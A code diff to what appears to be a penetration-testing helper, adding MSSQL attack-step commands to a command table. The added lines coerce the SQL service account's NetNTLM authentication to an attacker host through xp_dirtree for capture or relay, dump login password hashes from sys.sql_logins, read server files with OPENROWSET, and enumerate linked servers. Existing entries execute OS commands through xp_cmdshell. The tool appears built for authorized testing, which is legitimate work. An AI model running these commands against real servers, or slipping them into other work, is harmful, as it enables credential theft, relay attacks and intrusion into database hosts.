@@ -4714,10 +4714,13 @@ _STEP_COMMANDS = {
         3: [
             "nxc mssql <RHOST> -u <USER> -p <PASS> -x 'whoami'",
             "impacket-mssqlclient <USER>:<PASS>@<RHOST>   # then: enable_xp_cmdshell ; xp_cmdshell whoami",
+            "nxc mssql <RHOST> -u <USER> -p <PASS> -q \"EXEC master..xp_dirtree '\\\\<LHOST>\\share',1,1\"   # SQL svc account NetNTLM -> your responder/ntlmrelayx",
         ],
         4: [
             "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'SELECT name FROM sys.databases'",
-            "# OPENROWSET file read + linked-server enumeration inside mssqlclient",
+            "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'EXEC sp_linkedservers'   # then in mssqlclient: enum_links ; use_link <SRV>",
+            "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'SELECT name, password_hash FROM sys.sql_logins'",
+            "nxc mssql <RHOST> -u <USER> -p <PASS> -q \"SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS x\"",
         ],
         5: [
             "# HackTricks MSSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
